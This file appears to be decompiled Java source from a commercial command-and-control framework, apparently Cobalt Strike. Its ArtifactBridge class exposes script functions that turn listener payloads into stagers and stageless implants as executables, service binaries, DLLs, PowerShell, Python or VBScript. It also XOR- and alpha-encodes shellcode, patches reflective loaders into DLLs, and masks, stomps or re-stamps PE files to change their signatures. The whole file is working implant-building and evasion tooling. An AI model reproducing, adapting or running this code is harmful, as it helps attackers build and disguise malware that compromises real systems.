package aggressor.bridges;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import aggressor.TeamServerProps;
import common.ArtifactUtils;
import common.Callback;
import common.CommonUtils;
import common.DevLog;
import common.License;
import common.ListenerUtils;
import common.MutantResourceUtils;
import common.PowerShellUtils;
import common.ReflectiveDLL;
import common.ResourceUtils;
import common.ScListener;
import cortana.Cortana;
import encoders.Transforms;
import java.util.Map;
import java.util.Stack;
import pe.BeaconLoader;
import pe.OBJExecutable;
import pe.OBJExecutableSimple;
import pe.PEEditor;
import pe.PEParser;
import sleep.bridges.BridgeUtilities;
import sleep.bridges.SleepClosure;
import sleep.interfaces.Function;
import sleep.interfaces.Loadable;
import sleep.interfaces.Predicate;
import sleep.runtime.Scalar;
import sleep.runtime.ScriptInstance;
import sleep.runtime.SleepUtils;

public class ArtifactBridge implements Function, Loadable, Predicate {
   protected AggressorClient client;

   public ArtifactBridge(AggressorClient var1) {
      this.client = var1;
   }

   public void scriptLoaded(ScriptInstance var1) {
      Cortana.put(var1, "&artifact_sign", this);
      Cortana.put(var1, "&transform", this);
      Cortana.put(var1, "&transform_vbs", this);
      Cortana.put(var1, "&encode", this);
      Cortana.put(var1, "&str_chunk", this);
      Cortana.put(var1, "&artifact_payload", this);
      Cortana.put(var1, "&artifact_stager", this);
      Cortana.put(var1, "&artifact_general", this);
      Cortana.put(var1, "&payload", this);
      Cortana.put(var1, "&payload_local", this);
      Cortana.put(var1, "&stager", this);
      Cortana.put(var1, "&stager_bind_tcp", this);
      Cortana.put(var1, "&stager_bind_pipe", this);
      DevLog.log(DevLog.STORY.CS0217, this.getClass(), "scriptLoaded", "define reflective loader methods");
      Cortana.put(var1, "&extract_reflective_loader", this);
      Cortana.put(var1, "&setup_reflective_loader", this);
      DevLog.log(DevLog.STORY.CS0218, this.getClass(), "scriptLoaded", "define dll support APIs");
      Cortana.put(var1, "&pedump", this);
      Cortana.put(var1, "&pe_mask", this);
      Cortana.put(var1, "&pe_mask_section", this);
      Cortana.put(var1, "&pe_mask_string", this);
      Cortana.put(var1, "&pe_patch_code", this);
      Cortana.put(var1, "&pe_set_string", this);
      Cortana.put(var1, "&pe_set_stringz", this);
      Cortana.put(var1, "&pe_set_long", this);
      Cortana.put(var1, "&pe_set_short", this);
      Cortana.put(var1, "&pe_set_value_at", this);
      Cortana.put(var1, "&pe_stomp", this);
      Cortana.put(var1, "&pe_insert_rich_header", this);
      Cortana.put(var1, "&pe_remove_rich_header", this);
      Cortana.put(var1, "&pe_set_export_name", this);
      Cortana.put(var1, "&pe_set_checksum", this);
      Cortana.put(var1, "&pe_update_checksum", this);
      Cortana.put(var1, "&pe_set_compile_time_with_long", this);
      Cortana.put(var1, "&pe_set_compile_time_with_string", this);
      Cortana.put(var1, "&bof_extract", this);
      Cortana.put(var1, "&payload_bootstrap_hint", this);
      Cortana.put(var1, "&artifact", this);
      Cortana.put(var1, "&artifact_stageless", this);
      Cortana.put(var1, "&shellcode", this);
      Cortana.put(var1, "&powershell", this);
      var1.getScriptEnvironment().getEnvironment().put("-hasbootstraphint", this);
   }

   public boolean decide(String var1, ScriptInstance var2, Stack var3) {
      byte[] var4 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
      if ("-hasbootstraphint".equals(var1)) {
         if (!DataUtils.getProfile(this.client.getData()).option(".stage.smartinject")) {
            return false;
         } else {
            return BeaconLoader.hasLoaderHintX(var4, "x86") || BeaconLoader.hasLoaderHintX(var4, "x64");
         }
      } else {
         return false;
      }
   }

   public void scriptUnloaded(ScriptInstance var1) {
   }

   public byte[] toArtifact(byte[] var1, String var2, String var3) {
      byte[] var4 = new byte[0];
      if ("x64".equals(var2)) {
         if ("exe".equals(var3)) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64.exe");
         } else if ("svcexe".equals(var3)) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64svc.exe");
         } else if ("dll".equals(var3)) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64.x64.dll");
         } else if ("dllx64".equals(var3)) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64.x64.dll");
         } else if ("powershell".equals(var3)) {
            var4 = (new ResourceUtils(this.client)).buildPowerShell(var1, true);
         } else if ("python".equals(var3)) {
            var4 = (new ResourceUtils(this.client)).buildPython(new byte[0], var1);
         } else if ("raw".equals(var3)) {
            var4 = var1;
         } else if ("vbscript".equals(var3)) {
            throw new RuntimeException("The VBS output is only compatible with x86 stagers (for now)");
         }
      } else {
         if (!"x86".equals(var2)) {
            throw new RuntimeException("Invalid arch valid '" + var2 + "'");
         }

         if ("exe".equals(var3)) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact32.exe");
         } else if ("svcexe".equals(var3)) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact32svc.exe");
         } else if ("dll".equals(var3)) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact32.dll");
         } else {
            if ("dllx64".equals(var3)) {
               throw new RuntimeException("Can not generate an x64 dll for an x86 stager. Try dll");
            }

            if ("powershell".equals(var3)) {
               var4 = (new ResourceUtils(this.client)).buildPowerShell(var1, false);
            } else if ("python".equals(var3)) {
               var4 = (new ResourceUtils(this.client)).buildPython(var1, new byte[0]);
            } else if ("raw".equals(var3)) {
               var4 = var1;
            } else {
               if (!"vbscript".equals(var3)) {
                  throw new RuntimeException("Unrecognized artifact type: '" + var3 + "'");
               }

               var4 = (new MutantResourceUtils(this.client)).buildVBS(var1);
            }
         }
      }

      return var4;
   }

   public byte[] toStagelessArtifact(byte[] var1, String var2, String var3) {
      byte[] var4 = new byte[0];
      if ("x64".equals(var2)) {
         if (var3.equals("exe")) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64big.exe");
         } else if (var3.equals("svcexe")) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64svcbig.exe");
         } else if (var3.equals("dll")) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64big.x64.dll");
         } else if (var3.equals("dllx64")) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64big.x64.dll");
         } else if (var3.equals("powershell")) {
            var4 = (new ResourceUtils(this.client)).buildPowerShell(var1, true);
         } else if (var3.equals("python")) {
            var4 = (new ResourceUtils(this.client)).buildPython(new byte[0], var1);
         } else {
            if (!var3.equals("raw")) {
               throw new RuntimeException("Unrecognized artifact type: '" + var3 + "'");
            }

            var4 = var1;
         }
      } else {
         if (!"x86".equals(var2)) {
            throw new RuntimeException("Invalid arch valid '" + var2 + "'");
         }

         if (var3.equals("exe")) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact32big.exe");
         } else if (var3.equals("svcexe")) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact32svcbig.exe");
         } else if (var3.equals("dll")) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact32big.dll");
         } else {
            if (var3.equals("dllx64")) {
               throw new RuntimeException("Can't generate x64 DLL for x86 payload stage.");
            }

            if (var3.equals("powershell")) {
               var4 = (new ResourceUtils(this.client)).buildPowerShell(var1);
            } else if (var3.equals("python")) {
               var4 = (new ResourceUtils(this.client)).buildPython(var1, new byte[0]);
            } else {
               if (!var3.equals("raw")) {
                  throw new RuntimeException("Unrecognized artifact type: '" + var3 + "'");
               }

               var4 = var1;
            }
         }
      }

      return var4;
   }

   public Scalar evaluate(String var1, ScriptInstance var2, Stack var3) {
      byte[] var14;
      if ("&artifact_sign".equals(var1)) {
         var14 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
         return SleepUtils.getScalar(DataUtils.getSigner(this.client.getData()).sign(var14));
      } else {
         final String var4;
         final String var5;
         final String var6;
         final String var7;
         if ("&artifact_stageless".equals(var1)) {
            var4 = BridgeUtilities.getString(var3, "");
            var5 = BridgeUtilities.getString(var3, "");
            var6 = BridgeUtilities.getString(var3, "x86");
            var7 = BridgeUtilities.getString(var3, "");
            final SleepClosure var8 = BridgeUtilities.getFunction(var3, var2);
            this.client.getConnection().call("aggressor.ping", CommonUtils.args(var4), new Callback() {
               public void result(String var1, Object var2) {
                  ScListener var3 = ListenerUtils.getListener(ArtifactBridge.this.client, var4);
                  var3.setProxyString(var7);
                  DevLog.log(DevLog.STORY.CS0215_TEST_EXPORT, this.getClass(), "evaluate.result {&artifact_stageless}", "001");
                  byte[] var4x = (byte[])var3.export(ArtifactBridge.this.client, var6);
                  byte[] var5x = ArtifactBridge.this.toStagelessArtifact(var4x, var6, var5);
                  Stack var6x = new Stack();
                  var6x.push(SleepUtils.getScalar(var5x));
                  SleepUtils.runCode((SleepClosure)var8, "&artifact_stageless", (ScriptInstance)null, var6x);
               }
            });
         } else {
            byte[] var9;
            byte[] var25;
            ScListener var28;
            if ("&artifact_payload".equals(var1)) {
               var4 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "");
               var6 = BridgeUtilities.getString(var3, "x86");
               var28 = ListenerUtils.getListener(this.client, var4);
               if (var28 == null) {
                  throw new RuntimeException("No listener '" + var4 + "'");
               }

               DevLog.log(DevLog.STORY.CS0215_TEST_EXPORT, this.getClass(), "evaluate {&artifact_payload}", "002");
               var25 = (byte[])var28.export(this.client, var6);
               var9 = this.toStagelessArtifact(var25, var6, var5);
               return SleepUtils.getScalar(var9);
            }

            if ("&artifact_general".equals(var1)) {
               var14 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               var5 = BridgeUtilities.getString(var3, "");
               var6 = BridgeUtilities.getString(var3, "x86");
               if (var14.length < 1024) {
                  return SleepUtils.getScalar(this.toArtifact(var14, var6, var5));
               }

               return SleepUtils.getScalar(this.toStagelessArtifact(var14, var6, var5));
            }

            if ("&artifact_stager".equals(var1)) {
               var4 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "");
               var6 = BridgeUtilities.getString(var3, "x86");
               var28 = ListenerUtils.getListener(this.client, var4);
               if (var28 == null) {
                  throw new RuntimeException("No listener '" + var4 + "'");
               }

               return SleepUtils.getScalar(this.toArtifact(var28.getPayloadStager(var6), var6, var5));
            }

            ScListener var29;
            if ("&stager".equals(var1)) {
               var4 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "x86");
               var29 = ListenerUtils.getListener(this.client, var4);
               if (var29 == null) {
                  throw new RuntimeException("No listener '" + var4 + "'");
               }

               return SleepUtils.getScalar(var29.getPayloadStager(var5));
            }

            if ("&stager_bind_tcp".equals(var1)) {
               var4 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "x86");
               int var32 = BridgeUtilities.getInt(var3, CommonUtils.randomPort());
               var28 = ListenerUtils.getListener(this.client, var4);
               return SleepUtils.getScalar(var28.getPayloadStagerLocal(var32, "x86"));
            }

            if ("&stager_bind_pipe".equals(var1)) {
               var4 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "x86");
               var29 = ListenerUtils.getListener(this.client, var4);
               var7 = var29.getConfig().getStagerPipe();
               if ("x86".equals(var5)) {
                  return SleepUtils.getScalar(var29.getPayloadStagerPipe(var7, "x86"));
               }

               throw new RuntimeException("x86 is the only arch option available with &stager_remote");
            }

            if ("&payload".equals(var1)) {
               var4 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "x86");
               var29 = ListenerUtils.getListener(this.client, var4);
               var7 = BridgeUtilities.getString(var3, "process");
               if (var29 == null) {
                  throw new RuntimeException("No listener '" + var4 + "'");
               }

               if ("process".equals(var7)) {
                  DevLog.log(DevLog.STORY.CS0215_TEST_EXPORT, this.getClass(), "evaluate {&payload : process}", "003");
                  return SleepUtils.getScalar(var29.export(this.client, var5));
               }

               if ("thread".equals(var7)) {
                  DevLog.log(DevLog.STORY.CS0215_TEST_EXPORT, this.getClass(), "evaluate {&payload : thread}", "004");
                  return SleepUtils.getScalar(var29.export(this.client, var5, 1));
               }

               throw new RuntimeException("'" + var7 + "' is not a valid exit argument");
            }

            if ("&payload_local".equals(var1)) {
               var4 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "");
               var6 = BridgeUtilities.getString(var3, "x86");
               var28 = ListenerUtils.getListener(this.client, var5);
               String var31 = BridgeUtilities.getString(var3, "process");
               if (var28 == null) {
                  throw new RuntimeException("No listener '" + var5 + "'");
               }

               if ("process".equals(var31)) {
                  DevLog.log(DevLog.STORY.CS0215_TEST_EXPORTLOCAL, this.getClass(), "evaluate {&payload_local : process}", "001");
                  return SleepUtils.getScalar(var28.exportLocal(this.client, var4, var6));
               }

               if ("thread".equals(var31)) {
                  DevLog.log(DevLog.STORY.CS0215_TEST_EXPORTLOCAL, this.getClass(), "evaluate {&payload_local : thread}", "002");
                  return SleepUtils.getScalar(var28.exportLocal(this.client, var4, var6, 1));
               }

               throw new RuntimeException("'" + var31 + "' is not a valid exit argument");
            }

            if ("&artifact".equals(var1)) {
               var4 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "");
               Scalar var27 = BridgeUtilities.getScalar(var3);
               var7 = BridgeUtilities.getString(var3, "x86");
               ScListener var30 = ListenerUtils.getListener(this.client, var4);
               return SleepUtils.getScalar(this.toArtifact(var30.getPayloadStager(var7), var7, var5));
            }

            Scalar var24;
            if ("&shellcode".equals(var1)) {
               var4 = BridgeUtilities.getString(var3, "");
               var24 = BridgeUtilities.getScalar(var3);
               var6 = BridgeUtilities.getString(var3, "x86");
               var28 = ListenerUtils.getListener(this.client, var4);
               if ("x64".equals(var6)) {
                  var25 = var28.getPayloadStager("x64");
                  return SleepUtils.getScalar(var25);
               }

               var25 = var28.getPayloadStager("x86");
               return SleepUtils.getScalar(var25);
            }

            if ("&powershell".equals(var1)) {
               var4 = BridgeUtilities.getString(var3, "");
               var24 = BridgeUtilities.getScalar(var3);
               var6 = BridgeUtilities.getString(var3, "x86");
               var28 = ListenerUtils.getListener(this.client, var4);
               if ("x64".equals(var6)) {
                  var25 = var28.getPayloadStager("x64");
                  var9 = (new PowerShellUtils(this.client)).buildPowerShellCommand(var25, true);
                  return SleepUtils.getScalar(CommonUtils.bString(var9));
               }

               var25 = var28.getPayloadStager("x86");
               var9 = (new PowerShellUtils(this.client)).buildPowerShellCommand(var25);
               return SleepUtils.getScalar(CommonUtils.bString(var9));
            }

            if ("&encode".equals(var1)) {
               var14 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               var5 = BridgeUtilities.getString(var3, "");
               var6 = BridgeUtilities.getString(var3, "x86");
               if (License.isTrial()) {
                  return SleepUtils.getScalar(var14);
               }

               if ("xor".equals(var5)) {
                  return SleepUtils.getScalar(ArtifactUtils._XorEncode(var14, var6));
               }

               if ("alpha".equals(var5) && "x86".equals(var6)) {
                  byte[] var26 = new byte[]{-21, 3, 95, -1, -25, -24, -8, -1, -1, -1};
                  return SleepUtils.getScalar(CommonUtils.join(var26, CommonUtils.toBytes(ArtifactUtils._AlphaEncode(var14))));
               }

               throw new IllegalArgumentException("No encoder '" + var5 + "' for " + var6);
            }

            int var18;
            if ("&str_chunk".equals(var1)) {
               var4 = BridgeUtilities.getString(var3, "");
               var18 = BridgeUtilities.getInt(var3, 100);
               return SleepUtils.getArrayWrapper(ArtifactUtils.toChunk(var4, var18));
            }

            if ("&transform".equals(var1)) {
               var14 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               var5 = BridgeUtilities.getString(var3, "");
               if ("array".equals(var5)) {
                  return SleepUtils.getScalar(Transforms.toArray(var14));
               } else if ("escape-hex".equals(var5)) {
                  return SleepUtils.getScalar(Transforms.toVeil(var14));
               } else if ("hex".equals(var5)) {
                  return SleepUtils.getScalar(ArtifactUtils.toHex(var14));
               } else if ("powershell-base64".equals(var5)) {
                  return SleepUtils.getScalar(CommonUtils.Base64PowerShell(CommonUtils.bString(var14)));
               } else if ("vba".equals(var5)) {
                  return SleepUtils.getScalar(Transforms.toVBA(var14));
               } else if ("vbs".equals(var5)) {
                  return SleepUtils.getScalar(ArtifactUtils.toVBS(var14));
               } else if ("veil".equals(var5)) {
                  return SleepUtils.getScalar(Transforms.toVeil(var14));
               } else {
                  throw new IllegalArgumentException("Type '" + var5 + "' is unknown");
               }
            }

            if ("&transform_vbs".equals(var1)) {
               var14 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               var18 = BridgeUtilities.getInt(var3, 8);
               return SleepUtils.getScalar(ArtifactUtils.toVBS(var14, var18));
            }

            if ("&payload_bootstrap_hint".equals(var1)) {
               var14 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               var5 = BridgeUtilities.getString(var3, "");
               if (!DataUtils.getProfile(this.client.getData()).option(".stage.smartinject")) {
                  throw new RuntimeException(".stage.smartinject in your profile is false. Call -hasbootstraphint to determine if it's profile-appropriate to use these hints.");
               }

               if (BeaconLoader.hasLoaderHintX(var14, "x64")) {
                  return SleepUtils.getScalar(BeaconLoader.getLoaderHint(var14, "x64", var5));
               }

               if (BeaconLoader.hasLoaderHintX(var14, "x86")) {
                  return SleepUtils.getScalar(BeaconLoader.getLoaderHint(var14, "x86", var5));
               }

               throw new RuntimeException("No loader hint in payload blob");
            }

            byte[] var15;
            if ("&extract_reflective_loader".equals(var1)) {
               var4 = "evaluate [&extract_reflective_loader]";
               DevLog.log(DevLog.STORY.CS0217, this.getClass(), var4, "Processing Extract Reflective Loader.");
               var15 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               DevLog.log(DevLog.STORY.CS0217, this.getClass(), var4, "binBlob Length: " + var15.length);
               OBJExecutableSimple var22 = new OBJExecutableSimple(var15);
               var22.parse();
               var22.processRelocations();
               if (var22.hasErrors()) {
                  throw new RuntimeException("Can't parse rDLL loader file:\n" + var22.getErrors());
               }

               DevLog.log(DevLog.STORY.CS0217, this.getClass(), var4, "Returning extracted reflective loader");
               return SleepUtils.getScalar(var22.getCode());
            }

            if ("&setup_reflective_loader".equals(var1)) {
               var4 = "evaluate [&setup_reflective_loader]";
               DevLog.log(DevLog.STORY.CS0217, this.getClass(), var4, "Processing Setup Reflective Loader.");
               var15 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               byte[] var20 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               long var23 = 0L;
               if (DevLog.isEnabled()) {
                  var23 = DevLog.checksumByteArray(var15);
               }

               if (var20.length > 5120) {
                  throw new IllegalArgumentException("Reflective DLL Content ($2) length (" + var20.length + ") exceeds 5KB length.");
               }

               var9 = new byte[5120];

               for(int var10 = 0; var10 < 5120; ++var10) {
                  var9[var10] = var20[var10 % var20.length];
               }

               PEParser var33 = PEParser.load(var15);
               ReflectiveDLL.setReflectiveLoader(var33, var15, var9);
               if (var33.is64()) {
                  ReflectiveDLL.patchDOSHeaderX64(var15, 1453503984);
               } else {
                  ReflectiveDLL.patchDOSHeader(var15, 1453503984);
               }

               DevLog.log(DevLog.STORY.CS0217, this.getClass(), var4, "Returning DLL updated with Reflective Loader.");
               if (DevLog.isEnabled()) {
                  long var11 = DevLog.checksumByteArray(var15);
                  DevLog.log(DevLog.STORY.CS0217, this.getClass(), var4, "Original Checksum: " + var23 + " New Checksum: " + var11);
               }

               return SleepUtils.getScalar(var15);
            }

            if ("&pedump".equals(var1)) {
               var4 = "evaluate [&pedump]";
               DevLog.log(DevLog.STORY.CS0218, this.getClass(), var4, "Processing PE Dump.");
               var15 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               if (DevLog.isEnabled()) {
                  long var17 = DevLog.checksumByteArray(var15);
                  DevLog.log(DevLog.STORY.CS0218, this.getClass(), var4, "DLL Length: " + var15.length + " DLL Checksum: " + var17);
               }

               PEParser var19;
               try {
                  var19 = PEParser.load(var15);
               } catch (Exception var13) {
                  throw new RuntimeException("Error loading dll into parser.", var13);
               }

               Map var21 = PEParser.dumpToDictionary(var19);
               return CommonUtils.convertAll(var21);
            }

            if ("&pe_mask".equals(var1) || "&pe_mask_section".equals(var1) || "&pe_mask_string".equals(var1) || "&pe_patch_code".equals(var1) || "&pe_set_string".equals(var1) || "&pe_set_stringz".equals(var1) || "&pe_set_long".equals(var1) || "&pe_set_short".equals(var1) || "&pe_set_value_at".equals(var1) || "&pe_stomp".equals(var1) || "&pe_insert_rich_header".equals(var1) || "&pe_remove_rich_header".equals(var1) || "&pe_set_export_name".equals(var1) || "&pe_set_checksum".equals(var1) || "&pe_update_checksum".equals(var1) || "&pe_set_compile_time_with_long".equals(var1) || "&pe_set_compile_time_with_string".equals(var1)) {
               return this.A(var1, var3);
            }

            if ("&bof_extract".equals(var1)) {
               var14 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               var5 = "not_used";
               if (var14 != null && var14.length > 0) {
                  OBJExecutable var16 = new OBJExecutable(var14, var5);
                  var16.parse();
                  if (var16.hasErrors()) {
                     throw new RuntimeException("Can't parse bof file:\n" + var16.getErrors());
                  }

                  return SleepUtils.getScalar(var16.getCode());
               }

               throw new RuntimeException("An empty bof file was passed in");
            }
         }

         return SleepUtils.getEmptyScalar();
      }
   }

   private Scalar A(String var1, Stack var2) {
      String var3 = "peEditFunction [" + var1 + "]";
      DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "Processing PE Function.");
      byte[] var4 = CommonUtils.toBytes(BridgeUtilities.getString(var2, ""));
      if (DevLog.isEnabled()) {
         long var5 = DevLog.checksumByteArray(var4);
         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "DLL Length: " + var4.length + " DLL Checksum: " + var5);
      }

      PEEditor var11 = new PEEditor(var4);
      if ("true".equalsIgnoreCase(TeamServerProps.getPropsFile().getString("logging.PEEditor_ArtifactBridge", "false"))) {
         var11.setLogActions(true);
      }

      byte var7 = -1;
      switch(var1.hashCode()) {
      case -2087919840:
         if (var1.equals("&pe_mask_string")) {
            var7 = 2;
         }
         break;
      case -1420399096:
         if (var1.equals("&pe_set_stringz")) {
            var7 = 5;
         }
         break;
      case -1340800860:
         if (var1.equals("&pe_set_checksum")) {
            var7 = 13;
         }
         break;
      case -1187750363:
         if (var1.equals("&pe_set_compile_time_with_string")) {
            var7 = 16;
         }
         break;
      case -743972426:
         if (var1.equals("&pe_mask_section")) {
            var7 = 1;
         }
         break;
      case -461461326:
         if (var1.equals("&pe_set_string")) {
            var7 = 4;
         }
         break;
      case -87997387:
         if (var1.equals("&pe_set_export_name")) {
            var7 = 12;
         }
         break;
      case -64432211:
         if (var1.equals("&pe_stomp")) {
            var7 = 9;
         }
         break;
      case 7094818:
         if (var1.equals("&pe_set_value_at")) {
            var7 = 8;
         }
         break;
      case 7908921:
         if (var1.equals("&pe_remove_rich_header")) {
            var7 = 11;
         }
         break;
      case 52937565:
         if (var1.equals("&pe_set_long")) {
            var7 = 6;
         }
         break;
      case 643813614:
         if (var1.equals("&pe_insert_rich_header")) {
            var7 = 10;
         }
         break;
      case 1085047637:
         if (var1.equals("&pe_update_checksum")) {
            var7 = 14;
         }
         break;
      case 1106103312:
         if (var1.equals("&pe_mask")) {
            var7 = 0;
         }
         break;
      case 1285699984:
         if (var1.equals("&pe_set_compile_time_with_long")) {
            var7 = 15;
         }
         break;
      case 1647322043:
         if (var1.equals("&pe_set_short")) {
            var7 = 7;
         }
         break;
      case 1983221160:
         if (var1.equals("&pe_patch_code")) {
            var7 = 3;
         }
      }

      String var8;
      long var9;
      long var12;
      int var13;
      byte[] var14;
      byte[] var16;
      byte var17;
      switch(var7) {
      case 0:
         var13 = BridgeUtilities.getInt(var2);
         int var18 = BridgeUtilities.getInt(var2);
         byte var10 = (byte)BridgeUtilities.getInt(var2);
         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Start=" + var13 + " Length=" + var18 + " MaskKey=" + var10);
         var11.mask(var13, var18, var10);
         break;
      case 1:
         var8 = BridgeUtilities.getString(var2, "");
         var17 = (byte)BridgeUtilities.getInt(var2);
         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> SectionName=" + var8 + " MaskKey=" + var17);
         var11.maskSection(var8, var17);
         break;
      case 2:
         var13 = BridgeUtilities.getInt(var2);
         var17 = (byte)BridgeUtilities.getInt(var2);
         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Location=" + var13 + " MaskKey=" + var17);
         var11.maskString(var13, var17);
         break;
      case 3:
         var14 = CommonUtils.toBytes(BridgeUtilities.getString(var2, ""));
         var16 = CommonUtils.toBytes(BridgeUtilities.getString(var2, ""));
         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> findme=" + CommonUtils.toHexString(var14) + " replaceme=" + CommonUtils.toHexString(var16));
         var11.patchCode(var14, var16);
         break;
      case 4:
         var13 = BridgeUtilities.getInt(var2);
         var16 = CommonUtils.toBytes(BridgeUtilities.getString(var2, ""));
         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Offset=" + var13 + " Value=" + CommonUtils.bString(var16));
         var11.setString(var13, var16);
         break;
      case 5:
         var13 = BridgeUtilities.getInt(var2);
         String var15 = BridgeUtilities.getString(var2, "");
         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Offset=" + var13 + " Value=" + var15);
         var11.setStringZ(var13, var15);
         break;
      case 6:
         var13 = BridgeUtilities.getInt(var2);
         var9 = BridgeUtilities.getLong(var2);
         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Offset=" + var13 + " Value=" + var9);
         var11.setLong(var13, var9);
         break;
      case 7:
         var13 = BridgeUtilities.getInt(var2);
         var9 = BridgeUtilities.getLong(var2);
         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Offset=" + var13 + " Value=" + var9);
         var11.setShort(var13, var9);
         break;
      case 8:
         var8 = BridgeUtilities.getString(var2, "");
         var9 = BridgeUtilities.getLong(var2);
         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Name=" + var8 + " Value=" + var9);
         var11.setValueAt(var8, var9);
         break;
      case 9:
         var13 = BridgeUtilities.getInt(var2);
         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Location=" + var13);
         var11.stomp(var13);
         break;
      case 10:
         var14 = CommonUtils.toBytes(BridgeUtilities.getString(var2, ""));
         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, " RichHeader=" + CommonUtils.toHexString(var14));
         var11.insertRichHeader(var14);
         break;
      case 11:
         var13 = BridgeUtilities.getInt(var2);
         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, ">");
         var11.removeRichHeader();
         break;
      case 12:
         var8 = BridgeUtilities.getString(var2, "");
         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> ExportName=" + var8);
         var11.setExportName(var8);
         break;
      case 13:
         var12 = BridgeUtilities.getLong(var2);
         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Checksum=" + var12);
         var11.setChecksum(var12);
         break;
      case 14:
         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, ">");
         var11.updateChecksum();
         break;
      case 15:
         var12 = BridgeUtilities.getLong(var2);
         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Date[seconds since 1969]=" + var12);
         var11.setCompileTime(var12);
         break;
      case 16:
         var8 = BridgeUtilities.getString(var2, "");
         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Date=" + var8);
         var11.setCompileTime(var8);
         break;
      default:
         CommonUtils.print_warn("Undefined PE edit function name: " + var1);
      }

      byte[] var6 = var11.getImage();
      if (DevLog.isEnabled()) {
         long var19 = DevLog.checksumByteArray(var6);
         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "New DLL Length: " + var6.length + " New DLL Checksum: " + var19);
      }

      return SleepUtils.getScalar(var6);
   }
}
